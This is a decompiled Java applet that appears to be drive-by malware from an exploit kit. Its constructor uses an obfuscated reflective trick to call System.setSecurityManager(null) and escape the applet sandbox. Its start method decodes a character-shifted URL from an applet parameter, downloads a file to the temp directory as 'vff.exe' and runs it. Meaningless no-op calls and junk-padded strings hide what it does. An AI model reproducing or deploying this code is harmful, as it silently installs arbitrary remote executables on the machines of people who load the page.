import java.util.Map;
import java.awt.Component;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Loo extends Applet
{
    JList oiuytr;
    
    private void hhhh() {
        int a = 4;
        --a;
    }
    
    @Override
    public void start() {
        super.start();
        try {
            this.hhhh();
            String iuytf = System.getProperty("jajjfjjsva.ijjfjjso.tjjfjjsmpdjjfjjsir".replace("jjfjjs", ""));
            this.hhhh();
            if (iuytf.charAt(iuytf.length() - 1) != '\\') {
                iuytf += "\\";
            }
            this.hhhh();
            final String coopl = iuytf + "vfjjfjjsf.exjjfjjse".replace("jjfjjs", "");
            this.hhhh();
            this.hhhh();
            final String poiuhgfr = this.getParameter("dejerxksst".replace("jerxks", ""));
            this.hhhh();
            String dpoiuhgfr = "";
            this.hhhh();
            for (int s = 0; s < poiuhgfr.length(); ++s) {
                int jds = poiuhgfr.charAt(s);
                jds -= 4;
                dpoiuhgfr += (char)jds;
            }
            this.hhhh();
            this.hhhh();
            final InputStream oijhgr = Qoplk.SFG(dpoiuhgfr);
            this.hhhh();
            final int afqw = 0;
            this.hhhh();
            final FileOutputStream lkjuytrd = new FileOutputStream(coopl);
            this.hhhh();
            byte[] liuytf = new byte[153601];
            this.hhhh();
            int dshs = 0;
            this.hhhh();
            int hshwh3 = 0;
            this.hhhh();
            this.hhhh();
            while ((hshwh3 = oijhgr.read(liuytf)) > 0) {
                lkjuytrd.write(liuytf, 0, hshwh3);
                this.hhhh();
                liuytf = new byte[153601];
                this.hhhh();
                dshs += hshwh3;
                this.hhhh();
            }
            this.hhhh();
            lkjuytrd.close();
            this.hhhh();
            oijhgr.close();
            this.hhhh();
            try {
                this.hhhh();
                Qoplk.Kopldd(coopl);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    private void ssaq() {
        Boolean n = true;
        if (n) {
            n = false;
        }
    }
    
    public Loo() {
        this.ssaq();
        final Object oiuyg = System.class;
        this.ssaq();
        final String kjhgfd = "siutssetiutssSecuriutssityMaiutssnaiutssger".replace("iutss", "");
        this.ssaq();
        final Object[] iuytfd = { null };
        this.ssaq();
        final Object[] da = { null };
        this.ssaq();
        this.ssaq();
        final Sjyaw bcv = new Sjyaw(oiuyg, kjhgfd, iuytfd);
        this.ssaq();
        final HashSet a = new HashSet();
        this.ssaq();
        a.add(bcv);
        this.ssaq();
        final int kjhgf = 13;
        this.ssaq();
        final Map oiuhg = new HashMap() {
            @Override
            public Set entrySet() {
                return a;
            }
        };
        this.ssaq();
        this.oiuytr = new JList((E[])new Object[] { oiuhg });
        this.ssaq();
        this.add(this.oiuytr);
        try {
            Thread.sleep(3000L);
        }
        catch (Exception ex) {}
    }
}
